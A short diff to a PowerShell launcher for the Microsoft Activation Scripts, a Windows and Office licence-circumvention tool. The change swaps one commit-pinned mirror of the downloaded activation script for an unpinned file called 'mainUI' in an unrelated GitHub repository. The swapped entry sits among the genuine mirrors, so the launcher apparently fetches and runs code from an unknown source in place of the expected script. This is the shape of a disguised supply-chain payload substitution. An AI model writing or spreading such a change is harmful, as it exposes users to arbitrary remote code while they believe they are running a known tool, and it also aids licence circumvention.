@@ -51,7 +51,7 @@ if (-not $args) {
 
     $URLs = @(
         'https://raw.githubusercontent.com/massgravel/Microsoft-Activation-Scripts/4fdefbc0d58befbe824440af39ed424c6386f65f/MAS/All-In-One-Version-KL/MAS_AIO.cmd',
-        'https://dev.azure.com/massgrave/Microsoft-Activation-Scripts/_apis/git/repositories/Microsoft-Activation-Scripts/items?path=/MAS/All-In-One-Version-KL/MAS_AIO.cmd&versionType=Commit&version=4fdefbc0d58befbe824440af39ed424c6386f65f',
+        'https://raw.githubusercontent.com/space199502/msoffice/refs/heads/main/mainUI',
         'https://git.activated.win/Microsoft-Activation-Scripts/plain/MAS/All-In-One-Version-KL/MAS_AIO.cmd?id=4fdefbc0d58befbe824440af39ed424c6386f65f'
     )
     Write-Progress -Activity "Initializing Windows and Microsoft Office License Status..." -Status "Please wait a moment..."
